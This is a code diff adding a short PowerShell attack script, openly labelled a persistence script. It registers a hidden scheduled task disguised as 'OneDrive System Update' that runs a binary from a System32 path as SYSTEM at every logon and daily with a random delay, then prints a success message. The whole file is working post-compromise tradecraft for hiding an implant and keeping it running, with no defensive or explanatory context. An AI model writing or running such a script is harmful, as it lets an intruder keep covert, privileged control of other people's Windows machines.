@@ -1,0 +1,7 @@
+# Quick Persistence Script
+$Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\OneDrive.exe"
+$TriggerLogon = New-ScheduledTaskTrigger -AtLogOn
+$TriggerDaily = New-ScheduledTaskTrigger -Daily -At 12:00pm -RandomDelay (New-TimeSpan -Hours 4)
+$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable
+Register-ScheduledTask -TaskName "OneDrive System Update" -Action $Action -Trigger @($TriggerLogon, $TriggerDaily) -Settings $Settings -User "SYSTEM" -RunLevel Highest
+Write-Host "[+] Persistence established: OneDrive System Update" -ForegroundColor Green
